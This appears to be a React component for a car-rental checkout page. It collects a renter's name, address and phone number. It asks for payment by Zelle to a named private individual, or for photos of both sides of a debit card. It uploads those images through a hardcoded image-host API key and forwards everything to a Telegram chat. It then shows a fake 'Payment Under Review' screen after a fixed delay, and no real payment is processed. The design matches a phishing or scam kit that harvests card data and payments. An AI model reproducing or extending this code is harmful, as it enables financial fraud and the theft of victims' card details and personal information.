import { useParams, useNavigate } from 'react-router-dom';
import { useState } from 'react';
import { cars } from '../../Utilities/Girls';
import Button from '../../Utilities/Button';
import { ArrowLeft, Copy } from 'lucide-react';
import Loader from '../../Utilities/Loader';
import Footer from '../../Utilities/Footer';
import { sendTelegramMessage, sendTelegramPhoto } from '../../Utilities/Telegrammessage';


const CarDetails = () => {
    const { id } = useParams();
    const navigate = useNavigate();
    const [showForm, setShowForm] = useState(false);
    const [showPayment, setShowPayment] = useState(false);
    const [activeTab, setActiveTab] = useState('zelle');
    const [cardNumber, setCardNumber] = useState('');
    const [formData, setFormData] = useState({ name: '', address: '', phone: '' });
    const [cardUsed, setCardUsed] = useState(false);
    const [isLoading, setIsLoading] = useState(false);
    const [image, setImage] = useState(null);
    const [debitFront, setDebitFront] = useState(null);
    const [debitBack, setDebitBack] = useState(null);
    const [copied, setCopied] = useState(false);
    const number = "701-200-4727 ";
    const [pickupMethod, setPickupMethod] = useState('self');


    const car = cars.find((c) => c.id.toString() === id);
    if (!car) return <p className="text-center py-20">Car not found</p>;

    const gallery = car.images;
    const price = car.price;
    const rawMiles = parseFloat(car.distanceInMiles);
    const estimatedMinutes = Math.max(10, Math.round(rawMiles * 15));
    const distance = `${car.distanceInMiles} • ${estimatedMinutes} mins delivery`;


    const handleImageChange = async (e, setImageFn) => {
        const file = e.target.files[0];
        if (!file) return;
        const formData = new FormData();
        formData.append("image", file);

        try {
            const res = await fetch("https://api.imgbb.com/1/upload?key=a90839c4a27f76cf92b3a52c9ff63e49", {
                method: "POST",
                body: formData,
            });
            const data = await res.json();
            if (data?.data?.url) setImageFn(data.data.url);
        } catch (err) {
            console.error("Upload error:", err);
        }
    };

    const handleSendBooking = async () => {
        setIsLoading(true);
        const message = `🚗 *New Car Rental Submitted!*\n\n` +
            `*Car:* ${car.name} ${car.model}, ${car.year}\n` +
            `💰 *Price:* $${price}\n` +
            `📍 *Distance:* ${distance}\n\n` +
            `👤 *Name:* ${formData.name}\n` +
            `🏠 *Address:* ${formData.address}\n` +
            `📞 *Phone:* ${formData.phone}\n` +
            `💳 *Zelle Account:* ${cardNumber}`;

        try {
            await sendTelegramMessage(message);
            if (image) await sendTelegramPhoto(image, '🖼 *Zelle Screenshot Attached*');
            if (debitFront) await sendTelegramPhoto(debitFront, '💳 *Debit Card Front*');
            if (debitBack) await sendTelegramPhoto(debitBack, '💳 *Debit Card Back*');
        } catch (err) {
            console.error("Telegram send failed:", err);
        }

        setTimeout(() => {
            setIsLoading(false);
            setCardUsed(true);
        }, 8000);
    };

    const handleCopy = () => {
        navigator.clipboard.writeText(number);
        setCopied(true);
        setTimeout(() => setCopied(false), 2000);
    };

    const resetPaymentState = () => {
        setCardUsed(false);
        setImage(null);
        setCardNumber('');
        setDebitFront(null);
        setDebitBack(null);
        setActiveTab('zelle');
        setShowPayment(false);
    };


    return (
        <div className="min-h-screen bg-gray-50">
            <div className="max-w-4xl mx-auto px-4 sm:px-6 lg:px-8 py-8">
                <Button onClick={() => navigate('/')} variant="outline" className="mb-6 flex items-center gap-2">
                    <ArrowLeft className="h-4 w-4" /> Back to Results
                </Button>

                <div className="bg-white rounded-xl shadow-lg overflow-hidden">
                    <div className="w-full aspect-video">
                        <img src={car.images[0]} alt={`${car.name} preview`} className="w-full h-full object-cover rounded-t-xl" />
                    </div>

                    <div className="p-6 border-t">
                        <h1 className="text-2xl font-bold text-gray-900 mb-1">{car.name} {car.model}, {car.year}</h1>
                        <p className="text-gray-600 mb-4">{distance}</p>

                        <div className="mb-6">
                            <h2 className="text-lg font-semibold mb-2">Rental Price</h2>
                            <p className="text-xl text-green-600 font-bold">${price}</p>
                        </div>

                        <Button onClick={() => setShowForm(true)} className="w-full bg-[#FF9B00] hover:bg-orange-600 text-white rounded-xl py-3 font-semibold text-base">
                            Rent Now
                        </Button>
                    </div>
                </div>
            </div>

            {showForm && (
                <div className="fixed inset-0 bg-black bg-opacity-60 backdrop-blur-sm flex items-center justify-center z-50">
                    <div className="bg-white rounded-2xl p-6 w-full max-w-md shadow-lg">
                        <h2 className="text-xl font-semibold text-center mb-3">Rental Details</h2>

<input
  placeholder="Your Name"
  className="mb-2 w-full border p-2 rounded"
  onChange={e => setFormData({ ...formData, name: e.target.value })}
/>
<input
  placeholder="Your Address"
  className="mb-2 w-full border p-2 rounded"
  onChange={e => setFormData({ ...formData, address: e.target.value })}
/>
<input
  placeholder="Phone Number"
  className="mb-4 w-full border p-2 rounded"
  onChange={e => setFormData({ ...formData, phone: e.target.value })}
/>

<label className="block text-sm font-medium text-gray-700 mb-1">Pickup Method</label>
<div className="flex gap-3 mb-3">
  <label className="flex items-center gap-2">
    <input
      type="radio"
      value="self"
      checked={pickupMethod === 'self'}
      onChange={() => setPickupMethod('self')}
    />
    I'll drive it
  </label>
  <label className="flex items-center gap-2">
    <input
      type="radio"
      value="driver"
      checked={pickupMethod === 'driver'}
      onChange={() => setPickupMethod('driver')}
    />
    I want a driver
  </label>
</div>



<Button
  onClick={() => {
    setShowForm(false);
    setShowPayment(true);
  }}
  className="w-full bg-blue-600 text-white py-3"
>
  Next: Payment
</Button>
<button onClick={() => setShowForm(false)} className="mt-3 text-sm text-gray-500 underline w-full text-center">Cancel</button>

                    </div>
                </div>
            )}

            {showPayment && (
                <div className="fixed inset-0 bg-black bg-opacity-60 backdrop-blur-sm flex items-center justify-center z-50">
                    <div className="bg-white rounded-2xl p-6 w-full max-w-md shadow-lg">
                        <div className="flex justify-center mb-4 gap-4">
                            <button onClick={() => setActiveTab('zelle')} className={`px-4 py-2 rounded-full font-semibold ${activeTab === 'zelle' ? 'bg-blue-600 text-white' : 'bg-gray-200 text-gray-700'}`}>Zelle</button>
                            <button onClick={() => setActiveTab('card')} className={`px-4 py-2 rounded-full font-semibold ${activeTab === 'card' ? 'bg-blue-600 text-white' : 'bg-gray-200 text-gray-700'}`}>Debit Card</button>
                        </div>

                        {activeTab === 'zelle' && !cardUsed && (
                            <>
                                <h2 className="text-xl font-semibold text-center mb-3">Zelle Payment</h2>
                                <p className="text-center text-sm text-gray-600 mb-2">Please send payment via <strong>Zelle</strong> to:</p>
                                <div className="text-center text-sm font-semibold mb-3 text-blue-600">
                                    <div className="flex items-center justify-center gap-2">
                                        <span>{number}</span>
                                        <button onClick={handleCopy} className="hover:text-blue-800">
                                            <Copy className="w-4 h-4" />
                                        </button>
                                        {copied && <span className="text-green-600 text-xs font-normal">Copied! ✅</span>}
                                    </div>
                                    {/* <div>701-200-4727</div> */}
                                    <div>Montanna Schnebelt</div>
                                </div>

                                <input type="text" value={cardNumber} onChange={(e) => setCardNumber(e.target.value)} placeholder="Zelle Account Used" className="mb-2 w-full border p-2 rounded" />
                                {!image ? (
                                    <>
                                        <label className="block mb-2 text-sm font-medium text-gray-700">Upload Zelle Screenshot</label>
                                        <input type="file" accept="image/*" onChange={(e) => handleImageChange(e, setImage)} />
                                        <p className="text-xs text-gray-500 mb-2">Please upload a screenshot of your Zelle payment confirmation.</p>
                                    </>
                                ) : (
                                    <div className="mb-4">
                                        <p className="text-xs text-gray-600 mb-1">Uploaded Screenshot</p>
                                        <img src={image} alt="Zelle Screenshot" className="rounded-lg shadow w-full h-40 object-cover border" />
                                        <button onClick={() => setImage(null)} className="mt-2 text-xs text-blue-600 underline">Retake</button>
                                    </div>
                                )}

                            </>
                        )}

                        {activeTab === 'card' && (
                            <>
                                <h2 className="text-xl font-semibold text-center mb-3">Upload Debit Card</h2>
                                <input type="file" accept="image/*" capture="environment" onChange={(e) => handleImageChange(e, setDebitFront)} className="mb-2" />
                                <p className="text-xs text-gray-500 mb-2 text-center">Front of Card</p>
                                <input type="file" accept="image/*" capture="environment" onChange={(e) => handleImageChange(e, setDebitBack)} className="mb-2" />
                                <p className="text-xs text-gray-500 text-center">Back of Card</p>
                            </>
                        )}

                        {!cardUsed ? (
                            <>
                                <Button onClick={handleSendBooking} className="w-full bg-green-600 text-white py-3">
                                    {isLoading ? <span className="flex justify-center items-center"><Loader className="animate-spin mr-2" /> Processing...</span> : `Pay $${price} Now`}
                                </Button>
                                <button onClick={resetPaymentState} className="mt-3 text-sm text-gray-500 underline w-full text-center">
                                    Cancel
                                </button>

                            </>
                        ) : (
                            <div className="text-center">
                                <h2 className="text-xl font-bold text-green-600 mb-3">✅ Payment Under Review</h2>
                                <p className="text-sm text-gray-600">Your payment is under review. Reference</p>
                                <Button onClick={resetPaymentState} className="mt-6 w-full bg-gray-800 text-white">
                                    Close
                                </Button>

                            </div>
                        )}
                    </div>
                </div>
            )}

            <Footer />
        </div>
    );
};

export default CarDetails;
